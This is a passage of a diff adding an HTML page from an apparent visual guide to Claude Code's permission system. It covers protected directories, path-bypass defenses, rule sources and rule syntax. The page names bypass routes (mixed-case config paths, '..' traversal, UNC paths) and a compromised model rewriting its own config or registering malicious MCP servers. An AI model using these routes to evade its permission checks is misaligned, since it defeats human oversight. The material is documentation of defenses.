+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.idea/<span class="fs-item-reason">JetBrains IDE settings</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.claude/<span class="fs-item-reason">Claude Code's own config</span></div>
+            </div>
+          </div>
+
+        </div><!-- .fs-grid -->
+
+        <!-- Defense mechanisms -->
+        <div class="fs-defense-grid reveal">
+
+          <div class="fs-defense-card">
+            <span class="fs-defense-icon">🔡</span>
+            <div class="fs-defense-title">Case-Insensitive Normalization</div>
+            <div class="fs-defense-desc">All paths are lowercased before comparison via <code>normalizeCaseForComparison()</code>. Applied unconditionally (even on Linux) to handle macOS/Windows case-insensitive filesystems. Prevents <code>.cLauDe/Settings.locaL.json</code> bypass.</div>
+          </div>
+
+          <div class="fs-defense-card">
+            <span class="fs-defense-icon">🧭</span>
+            <div class="fs-defense-title">Path Traversal Detection</div>
+            <div class="fs-defense-desc">Rejects paths containing <code>..</code> segments. Combined with symlink resolution for temp directories to prevent escaping the intended directory scope.</div>
+          </div>
+
+          <div class="fs-defense-card">
+            <span class="fs-defense-icon">🪟</span>
+            <div class="fs-defense-title">UNC Path Blocking</div>
+            <div class="fs-defense-desc">Blocks Windows UNC paths (<code>\\server\share</code>) which could be used to access network shares or bypass local path restrictions on Windows.</div>
+          </div>
+
+          <div class="fs-defense-card">
+            <span class="fs-defense-icon">🎯</span>
+            <div class="fs-defense-title">Skill Scoping</div>
+            <div class="fs-defense-desc">When editing files in <code>.claude/skills/{skillName}/</code>, the system offers a narrow permission scope — only that specific skill. Skill names containing <code>..</code>, glob metacharacters (<code>*</code> <code>?</code> <code>[</code> <code>]</code>), or empty strings are rejected.</div>
+          </div>
+
+        </div>
+
+        <div class="insight-callout reveal">
+          <p class="insight-callout-label">Why .claude/ is Protected</p>
+          <p>Claude Code's own config directory is treated as a dangerous directory — writable by neither <code>bypassPermissions</code> mode nor the default auto-mode flow. This prevents a compromised model from persisting new instructions or registering malicious MCP servers by modifying its own configuration files.</p>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- =================================================================
+         Section 6: Rule Sources
+         ================================================================= -->
+    <section class="page-section" id="rule-sources">
+      <div class="container">
+        <div class="section-header reveal">
+          <p class="section-label">Section 06</p>
+          <h2 class="section-title">Permission Rule Sources</h2>
+          <p class="section-desc">
+            Rules cascade from eight sources at runtime. User settings, project settings, policy, CLI args,
+            and session responses are all merged into the <code>ToolPermissionContext</code>.
+          </p>
+        </div>
+
+        <div class="rule-source-grid reveal">
+          <div class="rule-source-item">
+            <span class="rule-source-num">1</span>
+            <div class="rule-source-body">
+              <div class="rule-source-name">userSettings</div>
+              <div class="rule-source-desc"><code>~/.claude/settings.json</code> — global per-user rules applied in every project.</div>
+            </div>
+          </div>
+          <div class="rule-source-item">
+            <span class="rule-source-num">2</span>
+            <div class="rule-source-body">
+              <div class="rule-source-name">projectSettings</div>
+              <div class="rule-source-desc"><code>.claude/settings.json</code> — per-project, safe to check into the repo for sharing with teammates.</div>
+            </div>
+          </div>
+          <div class="rule-source-item">
+            <span class="rule-source-num">3</span>
+            <div class="rule-source-body">
+              <div class="rule-source-name">localSettings</div>
+              <div class="rule-source-desc"><code>.claude/settings.local.json</code> — per-project, gitignored. For personal developer preferences that shouldn't be shared.</div>
+            </div>
+          </div>
+          <div class="rule-source-item">
+            <span class="rule-source-num">4</span>
+            <div class="rule-source-body">
+              <div class="rule-source-name">flagSettings</div>
+              <div class="rule-source-desc">Feature flags and remote configuration pushed from Anthropic infrastructure.</div>
+            </div>
+          </div>
+          <div class="rule-source-item">
+            <span class="rule-source-num">5</span>
+            <div class="rule-source-body">
+              <div class="rule-source-name">policySettings</div>
+              <div class="rule-source-desc">Organization-level policy, read-only. Allows enterprises to enforce mandatory deny rules across all users.</div>
+            </div>
+          </div>
+          <div class="rule-source-item">
+            <span class="rule-source-num">6</span>
+            <div class="rule-source-body">
+              <div class="rule-source-name">cliArg</div>
+              <div class="rule-source-desc">Command-line <code>--allowedTools</code> and <code>--disallowedTools</code> flags. Useful for scripting and CI pipelines.</div>
+            </div>
+          </div>
+          <div class="rule-source-item">
+            <span class="rule-source-num">7</span>
+            <div class="rule-source-body">
+              <div class="rule-source-name">command</div>
+              <div class="rule-source-desc">Custom slash commands that declare their required tool permissions inline.</div>
+            </div>
+          </div>
+          <div class="rule-source-item">
+            <span class="rule-source-num">8</span>
+            <div class="rule-source-body">
+              <div class="rule-source-name">session</div>
+              <div class="rule-source-desc">Per-session rules accumulated when the user responds "always allow" or "always deny" to permission prompts during a session.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Rule format callout -->
+        <div class="insight-callout reveal" style="margin-top:var(--space-8);">
+          <p class="insight-callout-label">Rule Value Format</p>
+          <p>Rules use the format <code>"ToolName"</code> or <code>"ToolName(content)"</code>. The content portion constrains the rule to specific inputs. Three matching strategies apply: <strong>exact</strong> (<code>npm install</code>), <strong>prefix</strong> (<code>npm:*</code> legacy syntax), and <strong>wildcard</strong> (<code>git *</code> compiles to <code>/^git( .*)?$/s</code>). The <code>s</code> (dotAll) flag is critical for heredoc commands that contain embedded newlines.</p>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- =================================================================
+         Navigation Footer
+         ================================================================= -->
+    <div class="nav-footer">
+      <div class="container">
+        <div class="nav-footer-inner">
+          <a href="context-management.html" class="nav-footer-link">
+            <svg width="14" height="14" viewBox="0 0 14 14" fill="currentColor"><path d="M9 2L4 7l5 5" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            Context Management
+          </a>
+          <span class="nav-footer-center">Chapter 11 of 12</span>
+          <a href="index.html" class="nav-footer-link">
+            Back to Index
+            <svg width="14" height="14" viewBox="0 0 14 14" fill="currentColor"><path d="M5 2l5 5-5 5" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </a>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <p class="site-footer-text">Claude Code Visual Guide — Permission System</p>
+    </div>
+  </footer>
+
+  <script src="js/main.js"></script>
+  <script>
+  'use strict';
+
+  /* ========================================================================
+     Hero SVG Entrance Animation
+     ======================================================================== */
+  (function initHeroAnimation() {
+    const wrap = document.getElementById('hero-diagram-wrap');
+    if (!wrap) return;
+
+    const sequence = [
+      { id: 'node-tooluse',  delay: 0 },
+      { id: 'arrow-1',       delay: 200 },
+      { id: 'node-outer',    delay: 350 },
+      { id: 'arrow-2',       delay: 550 },
+      { id: 'node-inner',    delay: 700 },
+      { id: 'arrow-allow',   delay: 900 },
+      { id: 'arrow-deny',    delay: 1000 },
+      { id: 'arrow-ask',     delay: 1100 },
+      { id: 'node-allow',    delay: 1150 },
+      { id: 'node-deny',     delay: 1200 },
+      { id: 'node-ask',      delay: 1250 },
+      { id: 'arrow-yolo',    delay: 1500 },
+      { id: 'node-yolo',     delay: 1700 },
+    ];
+
+    let started = false;
+
+    function runSequence() {
+      if (started) return;
+      started = true;
+      sequence.forEach(({ id, delay }) => {
+        setTimeout(() => {
+          const el = wrap.querySelector('#' + id);
+          if (el) {
+            el.classList.add('visible');
+            // Keep dashed arrows flowing after reveal
+            if (el.classList.contains('hero-svg-arrow')) {
+              setTimeout(() => el.classList.add('arrow-flowing'), 600);
+            }
+          }
+        }, delay);
+      });
+    }
+
+    const observer = new IntersectionObserver((entries) => {
+      if (entries[0].isIntersecting) {
+        observer.disconnect();
+        runSequence();
+      }
+    }, { threshold: 0.2 });
+
+    observer.observe(wrap);
+  }());
+
+  /* ========================================================================
+     Expandable Flow Steps
+     ======================================================================== */
+  (function initFlowSteps() {
+    const steps = document.querySelectorAll('.flow-step');
+    steps.forEach(step => {
+      const header = step.querySelector('.flow-step-header');
+      if (!header) return;
+      header.addEventListener('click', () => {
+        const isOpen = step.classList.contains('step-open');
+        // Close all others
+        steps.forEach(s => {
+          s.classList.remove('step-open', 'step-active');
+        });
+        if (!isOpen) {
+          step.classList.add('step-open', 'step-active');
+        }
+      });
+    });
+  }());
+
+  /* ========================================================================
+     Scroll Reveal
+     ======================================================================== */
+  (function initReveal() {
+    const els = document.querySelectorAll('.reveal');
+    if (!els.length) return;
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.classList.add('in-view');
+          observer.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.08, rootMargin: '0px 0px -40px 0px' });
+
+    els.forEach(el => observer.observe(el));
+  }());
+
+  </script>
+</body>
+</html>
